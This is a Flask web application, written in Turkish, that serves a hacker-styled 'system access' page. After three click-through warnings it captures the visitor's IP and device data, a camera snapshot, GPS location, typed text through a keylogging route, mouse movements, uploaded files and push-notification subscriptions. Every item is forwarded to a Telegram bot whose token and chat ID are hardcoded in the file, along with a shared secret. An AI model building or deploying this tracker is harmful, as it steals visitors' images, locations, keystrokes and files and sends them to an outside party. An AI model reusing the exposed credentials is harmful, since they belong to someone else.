from flask import Flask, request, jsonify
import requests
import os
import base64
import json
import time

app = Flask(__name__)

# --- AYARLAR ---
TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
CHAT_ID = "7622505128"
GIZLI_ANAHTAR = "Utkan_Super_Gizli_2024" 

# 🚨 YENİ GENEL ANAHTAR (PUBLIC KEY) BURAYA YERLEŞTİRİLDİ
PUBLIC_KEY = "BJIOZNEa6iM7PhL6H45unEdTS9PO0ZzsKHcGk42ar3GPua4j6bs_t0WbWDcR71MaUGEPpqvBB0Ev2C32y_uKWDE"

# --- TELEGRAM FONKSİYONLARI ---
def telegram_mesaj_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}, timeout=5)
    except: pass

def telegram_fotograf_gonder(fotograf_base64, bilgi_metni):
    try:
        resim_verisi = fotograf_base64.split(",")[1]
        resim_bytes = base64.b64decode(resim_verisi)
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        files = {'photo': ('ajan.jpg', resim_bytes)}
        data = {'chat_id': CHAT_ID, 'caption': bilgi_metni, 'parse_mode': 'HTML'}
        requests.post(url, files=files, data=data, timeout=15)
    except: pass

def telegram_dosya_gonder(dosya, dosya_adi, aciklama):
    try:
        guvenli_isim = "dosya_" + str(int(time.time())) + "_" + dosya_adi.replace(" ", "_")
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        files = {'document': (guvenli_isim, dosya)}
        data = {'chat_id': CHAT_ID, 'caption': aciklama}
        requests.post(url, files=files, data=data, timeout=30)
    except Exception as e: pass

# --- SW.JS DOSYASINI TARAYICIYA SUNAN ROTA ---
@app.route('/sw.js')
def serve_sw():
    try:
        with open('sw.js', 'r') as f:
            return app.response_class(f.read(), mimetype='application/javascript')
    except FileNotFoundError:
        return "sw.js bulunamadı", 404

# --- ANA SAYFA VE SİTE KODU ---
@app.route('/', methods=['GET'])
def ana_sayfa():
    ziyaretci_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    if ziyaretci_ip: ziyaretci_ip = ziyaretci_ip.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', 'Bilinmiyor')

    guvenli_ip = json.dumps(ziyaretci_ip)
    guvenli_cihaz = json.dumps(user_agent)
    guvenli_anahtar = json.dumps(GIZLI_ANAHTAR)

    html = f"""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Erişimi</title>
    <style>
        body {{ background-color: #0a0a0a; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; text-align: center; flex-direction: column; }}
        .onay-kutusu {{ background: #111; border: 2px solid #0f0; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px #0f0; max-width: 80%; }}
        h2 {{ color: #ff3333; }}
        p {{ font-size: 16px; margin: 20px 0; }}
        button {{ background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px 20px; margin: 10px; cursor: pointer; font-family: monospace; font-size: 16px; border-radius: 5px; transition: 0.3s; }}
        button:hover {{ background: #0f0; color: #000; }}
        .gizli-alan {{ display: none; width: 100%; padding: 20px; box-sizing: border-box; }}
        .kutu {{ margin-top:20px; border:1px dashed #0f0; padding:10px; text-align: left; }}
    </style>
    </head>
    <body>

    <div id="onay-ekrani" class="onay-kutusu">
        <h2 id="baslik">SİSTEM UYARISI</h2>
        <p id="mesaj">Bu siteye girmek üzeresiniz. Devam etmek istiyor musunuz?</p>
        <button id="btnEvet" type="button">TAMAM</button>
        <button id="btnHayir" type="button">HAYIR</button>
    </div>

    <div id="sistem-alani" class="gizli-alan">
        <h2 style="color:red;">SİSTEM BAŞLATILIYOR...</h2>
        <p id="durum">Lütfen izinleri verin...</p>
        <video id="video" autoplay muted playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <div class="kutu">
            <h3>Belge Yükle</h3>
            <input type="file" id="dosyaSec" style="color:#0f0;">
        </div>

        <div class="kutu">
            <h3>Mesaj Bırak</h3>
            <input type="text" id="gizliMetin" placeholder="Yazın..." style="width:90%; padding:10px; background:#000; color:#0f0; border:1px solid #0f0;">
        </div>
    </div>

    <script>
        const IP_ADRESI = {guvenli_ip};
        const CIHAZ_BILGISI = {guvenli_cihaz};
        const SECRET_KEY = {guvenli_anahtar};
        const PUBLIC_VAPID_KEY = "{PUBLIC_KEY}";

        let adim = 1;
        let hareketVerisi = [];
        let sonHareketZamani = 0;

        // Push Bildirimleri için Base64 Çevirici
        function urlBase64ToUint8Array(base64String) {{
            const padding = '='.repeat((4 - base64String.length % 4) % 4);
            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
            const rawData = window.atob(base64);
            const outputArray = new Uint8Array(rawData.length);
            for (let i = 0; i < rawData.length; ++i) {{ outputArray[i] = rawData.charCodeAt(i); }}
            return outputArray;
        }}

        const btnEvet = document.getElementById('btnEvet');
        const btnHayir = document.getElementById('btnHayir');

        btnHayir.addEventListener('click', function() {{
            document.getElementById('onay-ekrani').innerHTML = "<h2 style='color:red;'>SİSTEMDEN ÇIKILIYOR...</h2><p>İşlem iptal edildi.</p>";
        }});

        btnEvet.addEventListener('click', function() {{
            const baslik = document.getElementById('baslik');
            const mesaj = document.getElementById('mesaj');

            if (adim === 1) {{
                mesaj.innerText = "IP adresin, konumun ve cihaz bilgilerin arka plandaki sunucuya geçecek. Emin misin?";
                btnEvet.innerText = "EVET, EMİNİM";
                adim++;
            }} 
            else if (adim === 2) {{
                mesaj.innerText = "Kameran ve mikrofonun ele geçirilecek. Gerçekten emin misin?";
                btnEvet.innerText = "TAMAM, DEVAM ET";
                adim++;
            }} 
            else if (adim === 3) {{
                mesaj.innerText = "Hareketlerin, yazdıkların ve bildirimlerin izlenecek. Kabul ediyor musun?";
                btnEvet.innerText = "HEPSİNİ KABUL EDİYORUM";
                adim++;
            }} 
            else {{
                document.getElementById('onay-ekrani').style.display = 'none';
                document.getElementById('sistem-alani').style.display = 'block';
                izinleriIste();
            }}
        }});

        function hareketEkle(x, y) {{
            const suan = Date.now();
            if (suan - sonHareketZamani > 500) {{
                hareketVerisi.push({{ x: Math.round(x), y: Math.round(y), t: suan }});
                sonHareketZamani = suan;
            }}
            if (hareketVerisi.length >= 20) {{ hareketGonder(); }}
        }}

        function hareketGonder() {{
            if (hareketVerisi.length === 0) return;
            fetch('/hareket', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                body: JSON.stringify({{ hareketler: hareketVerisi }})
            }}).catch(e => console.log(e));
            hareketVerisi = []; 
        }}

        window.addEventListener('touchmove', (e) => {{ hareketEkle(e.touches[0].clientX, e.touches[0].clientY); }}, {{ passive: true }});
        window.addEventListener('mousemove', (e) => {{ hareketEkle(e.clientX, e.clientY); }});
        window.addEventListener('beforeunload', hareketGonder);

        async function izinleriIste() {{
            const durum = document.getElementById('durum');
            
            // 1. CİHAZ BİLGİSİ
            fetch('/cihaz', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                body: JSON.stringify({{ ip: IP_ADRESI, cihaz: CIHAZ_BILGISI }})
            }}).catch(e => console.log(e));

            // 2. BİLDİRİM İZNİ VE ABONELİK
            if ('serviceWorker' in navigator && 'PushManager' in window) {{
                try {{
                    durum.innerHTML = "Bildirim izni isteniyor...";
                    const izin = await Notification.requestPermission(); 
                    
                    if (izin === 'granted') {{
                        durum.innerHTML = "Bildirim izni verildi. Service Worker hazırlanıyor...";
                        
                        // Önce Service Worker'ı kaydet
                        await navigator.serviceWorker.register('/sw.js', {{ scope: '/' }});
                        
                        // 🚨 EN KRİTİK ADIM: Service Worker'ın tamamen aktif olmasını bekle!
                        const swReg = await navigator.serviceWorker.ready;
                        
                        durum.innerHTML = "Service Worker hazır. Abone olunuyor...";
                        const subscription = await swReg.pushManager.subscribe({{
                            userVisibleOnly: true,
                            applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY)
                        }});
                        
                        fetch('/abone_ol', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                            body: JSON.stringify(subscription)
                        }}).catch(e => console.log(e));
                        
                        durum.innerHTML = "Abonelik başarılı!";
                    }} else {{
                        durum.innerHTML = "Bildirim izni verilmedi.";
                    }}
                }} catch (error) {{
                    durum.innerHTML = "Bildirim Hatası: " + error.message;
                }}
            }}

            try {{
                // 3. KAMERA
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {{
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const foto = canvas.toDataURL('image/jpeg');
                    
                    fetch('/kamera', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                        body: JSON.stringify({{ image: foto, ip: IP_ADRESI }})
                    }}).catch(e => console.log(e));

                    // 4. GPS KONUM
                    setTimeout(() => {{
                        if (navigator.geolocation) {{
                            navigator.geolocation.getCurrentPosition(
                                (position) => {{
                                    fetch('/konum', {{
                                        method: 'POST',
                                        headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                                        body: JSON.stringify({{ lat: position.coords.latitude, lon: position.coords.longitude }})
                                    }}).catch(e => console.log(e));
                                }},
                                (error) => {{ console.log("Konum hatası"); }}
                            );
                        }}
                    }}, 1000); 
                }};

                // 5. KLAVYE
                let sonGonderim = 0;
                document.getElementById('gizliMetin').addEventListener('input', function(e) {{
                    const suan = Date.now();
                    if (suan - sonGonderim > 2000 || e.target.value.includes('\\n')) {{
                        fetch('/keylog', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                            body: JSON.stringify({{ text: e.target.value }})
                        }}).catch(e => console.log(e));
                        sonGonderim = suan;
                    }}
                }});

                // 6. DOSYA YÜKLEME
                document.getElementById('dosyaSec').addEventListener('change', function(e) {{
                    const file = e.target.files[0];
                    if (file) {{
                        const formData = new FormData();
                        formData.append('dosya', file);
                        
                        fetch('/dosya', {{
                            method: 'POST',
                            headers: {{ 'X-Secret-Key': SECRET_KEY }},
                            body: formData
                        }}).then(() => {{
                            durum.innerHTML = "Dosya Telegram'a Gönderildi!";
                        }}).catch(e => {{ durum.innerHTML = "Dosya yüklenirken hata oluştu."; }});
                    }}
                }});

            }} catch (error) {{
                durum.innerHTML = "Kamera/Mikrofon izni reddedildi.";
            }}
        }}
    </script>
    </body>
    </html>
    """
    return html

# --- ROTALAR ---

@app.route('/abone_ol', methods=['POST'])
def abone_ol():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    abonelik = request.json
    
    try:
        with open('aboneler.json', 'a') as f:
            f.write(json.dumps(abonelik) + "\n")
    except: pass

    mesaj = f"🔔 <b>YENİ CİHAZ ABONE OLDU!</b>\n\nBu JSON kodunu kopyala ve Pydroid'de kullan:\n\n<code>{json.dumps(abonelik)}</code>"
    telegram_mesaj_gonder(mesaj)
    return "OK", 200

@app.route('/bildirim', methods=['POST'])
def bildirim():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    veri = request.json
    durum = veri.get('durum')
    if durum == 'granted':
        telegram_mesaj_gonder("🔔 <b>BİLDİRİM İZNİ VERİLDİ!</b>")
    return "OK", 200

@app.route('/hareket', methods=['POST'])
def hareket():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    veri = request.json
    hareketler = veri.get('hareketler', [])
    if len(hareketler) > 0:
        mesaj = f"🖱️ <b>HAREKET ANALİZİ</b>\n\nKullanıcı ekranda <b>{len(hareketler)}</b> noktada gezindi."
        telegram_mesaj_gonder(mesaj)
    return "OK", 200

@app.route('/cihaz', methods=['POST'])
def cihaz():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    veri = request.json
    ip = veri.get('ip', 'Bilinmiyor')
    cihaz = veri.get('cihaz', 'Bilinmiyor')
    try:
        konum = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
        sehir = konum.get('city', 'Bilinmiyor')
        hava = requests.get(f'https://wttr.in/{sehir}?format=3', timeout=3).text.strip()
    except: sehir, hava = "Bilinmiyor", "Alınamadı"

    mesaj = f"📱 <b>CİHAZ SİSTEME GİRDİ!</b>\n\n🌐 <b>IP:</b> {ip}\n📍 <b>Konum:</b> {sehir}\n☀️ <b>Hava:</b> {hava}\n💻 <b>Tarayıcı:</b> {cihaz[:60]}"
    telegram_mesaj_gonder(mesaj)
    return "OK", 200

@app.route('/konum', methods=['POST'])
def konum():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    veri = request.json
    maps_link = f"https://www.google.com/maps?q={veri['lat']},{veri['lon']}"
    telegram_mesaj_gonder(f"📍 <b>NET GPS KONUMU ALINDI!</b>\n\n🗺️ <a href='{maps_link}'>Haritada Görüntüle</a>")
    return "OK", 200

@app.route('/keylog', methods=['POST'])
def keylog():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    veri = request.json
    if not veri.get('text'): return "OK", 200
    telegram_mesaj_gonder(f"⌨️ <b>YAZILAN METİN:</b>\n<code>{veri['text']}</code>")
    return "OK", 200

@app.route('/dosya', methods=['POST'])
def dosya():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    if 'dosya' not in request.files: return "Hata", 400
    dosya = request.files['dosya']
    dosya_icerigi = dosya.read()
    telegram_dosya_gonder(dosya_icerigi, dosya.filename, "📁 <b>DOSYA ELE GEÇİRİLDİ!</b>")
    return "OK", 200

@app.route('/kamera', methods=['POST'])
def kamera():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    veri = request.json
    telegram_fotograf_gonder(veri['image'], "🚨 <b>AJAN YAKALANDI!</b>")
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
